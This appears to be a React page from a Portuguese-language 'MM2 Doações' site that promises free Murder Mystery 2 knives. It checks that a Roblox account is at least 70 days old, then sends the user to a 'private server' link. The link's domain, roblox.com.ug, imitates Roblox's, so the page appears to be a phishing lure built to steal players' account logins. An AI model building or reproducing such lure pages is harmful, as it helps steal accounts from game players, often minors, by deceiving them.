import { useState } from "react";
import { useLocation } from "wouter";

const PRIVATE_SERVER_LINK =
  "https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=03244819970514690360987911532867";

const MIN_DAYS = 70;

/* ── icons ── */
function SkullIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 2a8 8 0 0 0-8 8c0 3.5 2 6.5 5 7.5V20h2v2h2v-2h2v-2h1v-2.5c3-1 5-4 5-7.5a8 8 0 0 0-8-8z"/>
      <circle cx="9" cy="10" r="1.5" fill="currentColor" stroke="none"/>
      <circle cx="15" cy="10" r="1.5" fill="currentColor" stroke="none"/>
    </svg>
  );
}
function UserIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="8" r="4"/>
      <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
    </svg>
  );
}
function CheckCircleIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/>
      <polyline points="9 12 11 14 15 10"/>
    </svg>
  );
}
function XCircleIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10"/>
      <line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
    </svg>
  );
}
function ArrowRightIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
      <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
    </svg>
  );
}
function SwordIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="14.5 17.5 3 6 3 3 6 3 17.5 14.5"/>
      <line x1="13" y1="19" x2="19" y2="13"/>
      <line x1="16" y1="16" x2="20" y2="20"/>
      <line x1="19" y1="21" x2="21" y2="19"/>
    </svg>
  );
}
function ShieldIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
    </svg>
  );
}

type Status = "idle" | "loading" | "success" | "error" | "old";

interface UserResult {
  username: string;
  displayName: string;
  accountAgeDays: number;
  userId: number;
}

async function fetchRobloxUser(username: string): Promise<UserResult> {
  const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

  /* 1. resolve username → userId */
  const searchRes = await fetch(`${BASE}/api/roblox/verify-user?username=${encodeURIComponent(username)}`);
  if (!searchRes.ok) {
    const err = await searchRes.json().catch(() => ({}));
    throw new Error((err as { error?: string }).error ?? "Usuário não encontrado");
  }
  return (await searchRes.json()) as UserResult;
}

export default function Verificar() {
  const [, navigate] = useLocation();
  const [step, setStep]         = useState<1 | 2>(1);
  const [username, setUsername] = useState("");
  const [status, setStatus]     = useState<Status>("idle");
  const [result, setResult]     = useState<UserResult | null>(null);
  const [errorMsg, setErrorMsg] = useState("");

  async function handleVerify() {
    if (!username.trim()) return;
    setStatus("loading");
    setErrorMsg("");
    try {
      const data = await fetchRobloxUser(username.trim());
      setResult(data);
      if (data.accountAgeDays < MIN_DAYS) {
        setStatus("old");
      } else {
        setStatus("success");
        setStep(2);
      }
    } catch (e: unknown) {
      setStatus("error");
      setErrorMsg(e instanceof Error ? e.message : "Erro ao verificar conta.");
    }
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center px-4 py-10"
      style={{
        background: "#0a0006",
        backgroundImage: "radial-gradient(ellipse at 50% 0%, rgba(180,0,0,0.15) 0%, transparent 65%)",
      }}
    >
      {/* Logo / brand */}
      <button
        onClick={() => navigate("/")}
        className="flex items-center gap-2.5 mb-8 group"
      >
        <div
          className="w-10 h-10 rounded-xl flex items-center justify-center transition-all"
          style={{ background: "linear-gradient(135deg, #c41e3a, #7c1fa8)", boxShadow: "0 0 20px rgba(196,30,58,0.5)" }}
        >
          <SkullIcon className="w-6 h-6 text-white" />
        </div>
        <div className="text-left">
          <p className="font-black text-lg text-white leading-none">MM2 <span style={{ color: "#ef4444" }}>Doações</span></p>
        </div>
      </button>

      {/* Title */}
      <div className="text-center mb-8">
        <div className="flex items-center justify-center gap-2 mb-1">
          <ShieldIcon className="w-4 h-4" style={{ color: "#ef4444" }} />
          <p className="text-xs font-black tracking-[0.25em] uppercase" style={{ color: "#ef4444" }}>
            Verificação de Acesso
          </p>
          <ShieldIcon className="w-4 h-4" style={{ color: "#ef4444" }} />
        </div>
      </div>

      {/* Step indicators */}
      <div className="flex items-center gap-3 mb-8">
        {[1, 2].map((s) => {
          const isActive   = step === s;
          const isComplete = step > s;
          return (
            <div key={s} className="flex items-center gap-3">
              <div
                className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-black border-2 transition-all"
                style={{
                  borderColor: isActive || isComplete ? "#c41e3a" : "#2a1a1a",
                  color:       isActive ? "#ffffff"  : isComplete ? "#ef4444" : "#4b3030",
                  background:  isActive ? "#c41e3a22" : "transparent",
                  boxShadow:   isActive ? "0 0 14px rgba(196,30,58,0.4)" : "none",
                }}
              >
                {isComplete ? <CheckCircleIcon className="w-5 h-5" /> : s}
              </div>
              {s < 2 && (
                <div
                  className="w-12 h-0.5 rounded-full transition-all"
                  style={{ background: step > 1 ? "#c41e3a" : "#2a1a1a" }}
                />
              )}
            </div>
          );
        })}
      </div>

      {/* Card */}
      <div
        className="w-full max-w-sm rounded-2xl overflow-hidden"
        style={{
          background: "#120a0a",
          border: "1px solid rgba(196,30,58,0.25)",
          boxShadow: "0 0 40px rgba(196,30,58,0.1)",
        }}
      >
        {/* red top stripe */}
        <div className="h-0.5 w-full" style={{ background: "linear-gradient(90deg, transparent, #c41e3a, transparent)" }} />

        <div className="p-7">
          {/* ── STEP 1 ── */}
          {step === 1 && (
            <>
              {/* icon */}
              <div className="flex justify-center mb-5">
                <div
                  className="w-16 h-16 rounded-full flex items-center justify-center"
                  style={{ background: "rgba(196,30,58,0.1)", border: "1.5px solid rgba(196,30,58,0.35)" }}
                >
                  <UserIcon className="w-8 h-8" style={{ color: "#ef4444" }} />
                </div>
              </div>

              <h1 className="text-2xl font-black text-white text-center mb-2">
                Verificar Conta Roblox
              </h1>
              <p className="text-sm text-center mb-6" style={{ color: "#6b4444" }}>
                Digite seu nome de usuário do Roblox para verificar se você tem acesso.
              </p>

              {/* input */}
              <input
                type="text"
                placeholder="Seu username do Roblox..."
                value={username}
                onChange={(e) => { setUsername(e.target.value); setStatus("idle"); }}
                onKeyDown={(e) => e.key === "Enter" && handleVerify()}
                className="w-full px-4 py-3.5 rounded-xl text-sm mb-3 focus:outline-none transition-all"
                style={{
                  background: "#1a0d0d",
                  border: status === "error" ? "1.5px solid #ef4444" : "1.5px solid rgba(196,30,58,0.2)",
                  color: "white",
                }}
                disabled={status === "loading"}
              />

              {/* requirement */}
              <p className="text-xs text-center mb-5" style={{ color: "#4b3030" }}>
                Sua conta deve ter no mínimo{" "}
                <span className="font-black" style={{ color: "#ef4444" }}>{MIN_DAYS} dias</span>{" "}
                de existência para ter acesso.
              </p>

              {/* error message */}
              {(status === "error" || status === "old") && (
                <div
                  className="flex items-start gap-2 rounded-xl px-4 py-3 mb-4 text-sm"
                  style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.25)" }}
                >
                  <XCircleIcon className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
                  <p style={{ color: "#fca5a5" }}>
                    {status === "old" && result
                      ? `Conta muito nova! Seu conta tem ${result.accountAgeDays} dias. São necessários ${MIN_DAYS} dias.`
                      : errorMsg}
                  </p>
                </div>
              )}

              {/* button */}
              <button
                onClick={handleVerify}
                disabled={status === "loading" || !username.trim()}
                className="w-full py-4 rounded-xl font-black text-sm tracking-widest uppercase transition-all active:scale-95"
                style={{
                  background: status === "loading" ? "rgba(196,30,58,0.4)" : "linear-gradient(135deg, #c41e3a, #991b1b)",
                  color: "white",
                  boxShadow: status === "loading" ? "none" : "0 0 20px rgba(196,30,58,0.45)",
                  cursor: status === "loading" || !username.trim() ? "not-allowed" : "pointer",
                  opacity: !username.trim() ? 0.5 : 1,
                }}
              >
                {status === "loading" ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Verificando...
                  </span>
                ) : (
                  "Verificar Conta"
                )}
              </button>
            </>
          )}

          {/* ── STEP 2 ── */}
          {step === 2 && result && (
            <>
              {/* success icon */}
              <div className="flex justify-center mb-5">
                <div
                  className="w-16 h-16 rounded-full flex items-center justify-center"
                  style={{ background: "rgba(16,185,129,0.1)", border: "1.5px solid rgba(16,185,129,0.4)" }}
                >
                  <CheckCircleIcon className="w-9 h-9" style={{ color: "#10b981" }} />
                </div>
              </div>

              <h2 className="text-2xl font-black text-white text-center mb-1">
                Acesso Liberado!
              </h2>
              <p className="text-sm text-center mb-5" style={{ color: "#4b6655" }}>
                Conta verificada com sucesso ✓
              </p>

              {/* user info */}
              <div
                className="rounded-xl p-4 mb-6"
                style={{ background: "#0d1a13", border: "1px solid rgba(16,185,129,0.2)" }}
              >
                <div className="flex items-center justify-between text-sm mb-2">
                  <span style={{ color: "#4b5563" }}>Usuário</span>
                  <span className="font-bold text-white">{result.username}</span>
                </div>
                <div className="flex items-center justify-between text-sm mb-2">
                  <span style={{ color: "#4b5563" }}>Nome</span>
                  <span className="font-bold text-white">{result.displayName}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span style={{ color: "#4b5563" }}>Idade da conta</span>
                  <span className="font-bold" style={{ color: "#10b981" }}>{result.accountAgeDays} dias ✓</span>
                </div>
              </div>

              <p className="text-xs text-center mb-5" style={{ color: "#4b3030" }}>
                Entre no servidor privado e me encontre para receber sua faca!
              </p>

              {/* CTA */}
              <a
                href={PRIVATE_SERVER_LINK}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center justify-center gap-2.5 w-full py-4 rounded-xl font-black text-sm tracking-widest uppercase transition-all active:scale-95"
                style={{
                  background: "linear-gradient(135deg, #c41e3a, #7c1fa8)",
                  color: "white",
                  boxShadow: "0 0 24px rgba(196,30,58,0.5)",
                }}
              >
                <SwordIcon className="w-4 h-4" />
                Entrar no Servidor Privado
                <ArrowRightIcon className="w-4 h-4" />
              </a>

              <button
                onClick={() => { setStep(1); setStatus("idle"); setUsername(""); setResult(null); }}
                className="w-full mt-3 py-2.5 text-xs font-bold rounded-xl transition-colors"
                style={{ color: "#4b3030", background: "transparent" }}
              >
                ← Verificar outro usuário
              </button>
            </>
          )}
        </div>
      </div>

      {/* back link */}
      <button
        onClick={() => navigate("/")}
        className="mt-6 text-xs transition-colors"
        style={{ color: "#4b3030" }}
        onMouseEnter={(e) => ((e.target as HTMLElement).style.color = "#ef4444")}
        onMouseLeave={(e) => ((e.target as HTMLElement).style.color = "#4b3030")}
      >
        ← Voltar para o início
      </button>
    </div>
  );
}
